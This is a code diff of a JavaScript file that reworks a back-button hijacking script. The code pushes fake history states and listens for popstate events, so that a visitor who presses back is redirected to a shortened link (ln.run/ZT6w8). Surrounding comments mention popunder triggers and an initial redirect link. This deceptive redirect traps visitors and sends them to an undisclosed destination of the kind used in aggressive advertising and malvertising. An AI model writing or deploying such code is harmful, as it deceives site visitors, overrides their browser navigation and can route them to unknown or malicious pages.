@@ -235,33 +235,26 @@ const initialLink = "https://ln.run/TQGSS"; // Replace with the link you want to
 //     }, 1000); // Adjust the delay for your popunder trigger
 // });
 
-
 document.addEventListener("DOMContentLoaded", () => {
-    console.log("Page loaded. Monitoring history depth.");
+    console.log("Page loaded. Initializing back-button handling with explicit state tracking.");
 
-    // Step 1: Push a dummy state to the history stack
-    history.pushState({ state: "dummy" }, "", location.href + "?dummy=true");
-    console.log("Dummy state pushed to history stack. Current history length:", history.length);
+    // Step 1: Push explicit states to the history stack
+    history.pushState({ state: "initial" }, "", location.href);
+    console.log("Initial state pushed to history stack:", location.href);
 
-    // Step 2: Set up a mechanism to monitor history length
-    let previousHistoryLength = history.length;
+    history.pushState({ state: "dummy" }, "", location.href + "?step=1");
+    console.log("Dummy state pushed to history stack:", location.href + "?step=1");
 
-    // Create an interval to monitor changes in history length
-    const monitorHistory = setInterval(() => {
-        console.log("Monitoring history... Current history length:", history.length);
-        if (history.length < previousHistoryLength) {
+    // Step 2: Handle back button using explicit state detection
+    window.addEventListener("popstate", (event) => {
+        console.log("Popstate event detected. Current state:", event.state);
+        if (event.state && event.state.state === "initial") {
             console.log("Back button pressed! Redirecting...");
-            clearInterval(monitorHistory); // Stop the monitoring interval
             location.href = "https://ln.run/ZT6w8"; // Replace with your desired URL
         }
-    }, 100); // Check every 100ms
-
-    // Step 3: Clean up the monitoring interval on page unload (optional)
-    window.addEventListener("beforeunload", () => {
-        clearInterval(monitorHistory);
-        console.log("Page unloading, monitoring stopped.");
     });
 });
+
 
 
 
